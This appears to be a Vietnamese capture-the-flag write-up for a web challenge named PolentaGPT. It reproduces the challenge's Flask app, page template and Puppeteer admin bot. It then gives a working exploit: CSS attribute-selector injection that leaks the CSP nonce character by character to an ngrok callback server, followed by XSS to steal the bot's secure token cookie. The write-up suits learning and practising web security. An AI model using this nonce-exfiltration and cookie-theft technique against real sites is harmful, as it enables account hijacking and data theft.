@@ -1,0 +1,317 @@
+PolentaGPT:
+    chúng ta có 1 file app.py , 1 index.html và 1 con bot
+    (*) source app.py:
+    
+        import os, base64
+    import random
+    import string
+    import requests
+    from flask import Flask, render_template, request, jsonify, make_response, g
+    
+    template_dir = os.path.abspath('templates')
+    
+    flag = os.getenv("FLAG")
+    securetoken = os.getenv("SECURETOKEN")
+    
+    OLLAMA_HOST = os.getenv("OLLAMA_HOST", "http://ollama:11434/api/generate")
+    
+    app = Flask(__name__, template_folder=template_dir)
+    
+    nonce_cache = {}
+    
+    def generate_nonce():
+        return ''.join(random.choices(string.ascii_letters + string.digits, k=32))
+    
+    @app.before_request
+    def before_request():
+        client_ip = request.remote_addr
+    
+        if client_ip not in nonce_cache:
+            nonce_cache[client_ip] = generate_nonce()
+            
+        g.nonce = nonce_cache[client_ip]
+    
+    @app.after_request
+    def apply_csp(response):
+        nonce = getattr(g, "nonce", None)
+        if nonce is None:
+            nonce = base64.b64encode(os.urandom(16)).decode()
+            g.nonce = nonce                   
+    
+        csp = (
+            f"script-src 'nonce-{nonce}'"
+            f"script-src-elem 'nonce-{nonce}'; "
+            f"script-src-attr 'nonce-{nonce}'; "
+            "object-src 'none'; "
+            "frame-ancestors 'none'; "
+            "upgrade-insecure-requests"
+        )
+    
+        response.headers["Content-Security-Policy"] = csp
+    
+        if request.cookies.get("securetoken") == securetoken:
+            response.set_cookie("flag", flag)
+    
+        return response
+    
+    
+    @app.route("/")
+    def index():
+        return make_response(render_template("index.html", nonce=g.nonce))
+    
+    @app.route("/chat", methods=["POST"])
+    def chat():
+        user_message = request.json.get("message", "")
+    
+        payload = {
+            "model": "qwen3:0.6b", 
+            "prompt": user_message,
+            "stream": False,
+            "max_tokens": 10,
+            "temperature": 0.1  
+        }
+    
+        try:
+            response = requests.post(OLLAMA_HOST, json=payload)
+            response_data = response.json()
+            ai_message = response_data.get("response", "Error in Ollama's response.")
+        except Exception as e:
+            ai_message = f"An error occurred: {e}"
+    
+        return jsonify({"reply": ai_message})
+    
+    
+    
+    
+    
+    if __name__ == "__main__":
+        app.run(debug=True, host="0.0.0.0")
+    
+    (*) source index.html
+          <!doctype html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>PolentaGPT - Chat with AI</title>
+        <nonce value="{{ nonce }}"></nonce>
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js" nonce="{{ nonce }}"></script>
+        <style>
+            body { font-family: Arial, sans-serif; background: #f0f0f0; }
+            #chat { width: 500px; margin: 50px auto; background: white; padding: 20px; border-radius: 5px; }
+            .message { margin: 10px 0; }
+            .user { color: blue; }
+            .ai { color: green; }
+            textarea { width: 100%; }
+            button { padding: 10px 20px; margin-top: 10px; }
+            .logo {
+                text-align: center;
+                margin-bottom: 20px;
+            }
+            .logo img {
+                max-width: 200px;
+            }
+        </style>
+    </head>
+    <body>
+        <div id="chat">
+            <div class="logo">
+                <!-- <img src="/static/polenta_logo.png" alt="PolentaGPT Logo"> -->
+            </div>
+            <h1>PolentaGPT Chat</h1>
+            <div id="chatbox"></div>
+            <form id="chatForm">
+                <textarea id="userInput" name="text" rows="3" placeholder="Write your message here..."></textarea><br>
+                <button id="sendBtn">Send</button>
+            </form>
+        </div>
+        <script nonce="{{ nonce }}" >
+            $(document).ready(function(){
+                $("#chatForm").submit(function(e){
+                    e.preventDefault();
+                });
+                $("#sendBtn").click(function(){
+                    var message = $("#userInput").val().trim();
+                    if(message === "") return;
+    
+                    $("#chatbox").append("<div class='message user'><strong>You:</strong> " + message + "</div>");
+                    $("#userInput").val("");
+    
+                    $.ajax({
+                        type: "POST",
+                        url: "/chat",
+                        contentType: "application/json",
+                        data: JSON.stringify({ message: message }),
+                        success: function(data){
+                            $("#chatbox").append("<div class='message ai'><strong>PolentaGPT:</strong> " + data.reply + "</div>");
+                            $("#chatbox").scrollTop($("#chatbox")[0].scrollHeight);
+                        },
+                        error: function(){
+                            $("#chatbox").append("<div class='message ai'><strong>PolentaGPT:</strong> Communication error.</div>");
+                        }
+                    });
+                });
+            });
+        </script>
+    </body>
+    </html>
+    source bot.js:
+    
+    const express = require("express");
+    const puppeteer = require("puppeteer");
+    
+    const app = express();
+    const securetoken = process.env.SECURETOKEN;
+    app.use(express.urlencoded({ extended: true }));
+    
+    const contactFormHtml = `
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <meta charset="UTF-8">
+      <title>Contact the Bot</title>
+    </head>
+    <body>
+      <h1>Contact the Bot</h1>
+      <form action="/contact" method="post">
+        <label for="text">Text to submit:</label>
+        <input type="text" id="text" name="text" placeholder="Enter your text here" required><br><br>
+        <button type="submit">Send</button>
+      </form>
+    </body>
+    </html>
+    `;
+    
+    app.get("/", (req, res) => {
+      res.send(contactFormHtml);
+    });
+    
+    app.post("/contact", async (req, res) => {
+      const text = req.body.text;
+      console.log("Received text:", text);
+      if (!text) {
+        return res.status(400).send("Text not provided");
+      }
+    
+      let browser;
+      try {
+        browser = await puppeteer.launch({
+          headless: "new",  // Ensure latest headless mode
+          args: ["--no-sandbox", "--disable-setuid-sandbox"]
+        });
+    
+        const page = await browser.newPage();
+        
+        await page.setCookie({
+          name: "securetoken",
+          value: securetoken,
+          url: "http://polentagpt:5000"
+        });
+        console.log('Secure token set in cookie:', securetoken);
+    
+        await page.goto("http://polentagpt:5000", { waitUntil: "domcontentloaded", timeout: 0 });
+        await page.content();
+        await page.waitForSelector('#userInput', { visible: true });
+        await page.type('#userInput', text);
+        await page.click('#sendBtn');
+    
+    
+    
+        await new Promise(resolve => setTimeout(resolve, 5000));
+        res.send("Done");
+      } catch (error) {
+        res.status(500).send(`Puppeteer error: ${error.message}`);
+      } finally {
+        if (browser) {
+          await browser.close();
+        }
+      }
+    });
+    
+    app.listen(5000, () => {
+      console.log("Server running on http://0.0.0.0:5000");
+    });
+    
+    
+    tổng kết lại , chúng ta có 1 cái app python có khả năng chat với AI cùng với filter csp cho xss khá căng:
+    (
+        csp = (
+            f"script-src 'nonce-{nonce}'"
+            f"script-src-elem 'nonce-{nonce}'; "
+            f"script-src-attr 'nonce-{nonce}'; "
+            "object-src 'none'; "
+            "frame-ancestors 'none'; "
+            "upgrade-insecure-requests"
+        )
+    )
+    ,phải có nonce thì mới có thể xử lý tag để inject xss được , tuy nonce mẫu có trong file index.html nhưng vì bản thân bot và clent dùng 2 nonce khác nhau
+    (vì nonce được gán với 1 ip riêng biệt :
+        client_ip = request.remote_addr
+    
+        if client_ip not in nonce_cache:
+            nonce_cache[client_ip] = generate_nonce()
+            
+        g.nonce = nonce_cache[client_ip]) nên tuy ta có thể inject tag ở clent nhưng không thế sử dụng ở bên bot để inject tag vô
+    
+    , 1 con bot có chứa securetoken 
+    (cái mà khi cho nó vào cookie của app py kia thì sẽ có Flag:
+        if request.cookies.get("securetoken") == securetoken:
+            response.set_cookie("flag", flag)
+    )
+    
+    mình đã thử rất nhiều cách, từ việc đoán seed đến các phương pháp bypass csp khác nhưng đều vô dụng
+    sau khi giải kết thúc thì mình mới có được câu trả lời từ wu của 1 ông bạn trong discord:
+    sử dụng css injection với css selector:
+    
+    ý tưởng : lợi dụng cơ chế của thẻ <style>nonce[value^="a"] { background-image: url(https://235c-62-176-122-50.ngrok-free.app/exfil?nonce=a); }
+      Với :
+        tạo các css selector với các điều kiện khác nhau (giống kiểu if else)
+        nonce[value^="a"] là các điều kiện kiểm tra nếu thoả mãn điều kiện nonce bắt đầu bằng "a" thì sẽ set css theo cái thuộc tính đó => đồng nghĩa với việc là nó sẽ curl đến url của chúng ta để confirm (thực chất là để lấy ảnh cho backgroud nhưng bị chúng ta lợi dụng làm cái để confirm điều kiện)
+        với điều kiện là phải có thẻ chứa nonce trong html trong app.py sẵn có
+    ==> từ đó ta có thể xây dựng script với ý tưởng như sau:
+    1. tạo server nhỏ với ngrok (hoặc cùng cloudfare ... nếu muốn)
+    gửi css selector với điều kiện kiểm tra với "for các kí tự để brute" vào trong input đến bot qua /contact với "data" param trong body chứa our payloads để bot đến trang app.py rồi nhập payload vào trong khung chat để tự mình thực hiện css injection
+    nếu đúng , query sẽ lập tức curl đến server của chúng ta để confirm , sau đó server của ta đã lập tiếp tục gửi data = các chữ cái trong nonce đã đc confirm + "for các kí tự để brute" để tiếp tục xác nhận cho đến khi tìm đc nonce đầy đủ thì cứ inject xss như thường thôi để lấy cookie=securetoken => tạo cookie ở trong web app.py để lấy Flag
+    
+    payload thực thi :
+    import requests
+    import string
+    from flask import Flask, request
+    
+    app = Flask(__name__)
+    
+    
+    BASE_URL = "https://polentagpt-bot-60b2b295.challs.cornc.tf"
+    headers = {
+        "Content-Type: application/x-www-form-urlencoded"
+    }
+    session = requests.Session()
+    
+    charset = string.ascii_letters + string.digits
+    
+    def exploit(known):
+        payload = "<style>"
+        for char in charset:
+            payload += f"""nonce[value^="{known}{char}"] {{ background-image: url(https://235c-62-176-122-50.ngrok-free.app/exfil?nonce={known}{char}); }}\n"""
+        payload += "</style>"
+    
+        data = {
+            "text": payload,
+        }
+    
+        r = session.post(BASE_URL + "/contact", data=data)
+    
+        return r.status_code
+    
+    @app.route("/exfil")
+    def home():
+        nonce = request.args.get("nonce")
+        print("Exfiltrating nonce:", nonce)
+        exploit(nonce)
+        return "OK", 200
+    
+    exploit("")
+    
+    if __name__ == "__main__":
+        app.run(host="127.0.0.1", port=1337, debug=True)
+    
+    xong có nonce thì cứ inject xss như thường thôi để lấy cookie=securetoken => tạo cookie ở trong web app.py để lấy Flag 
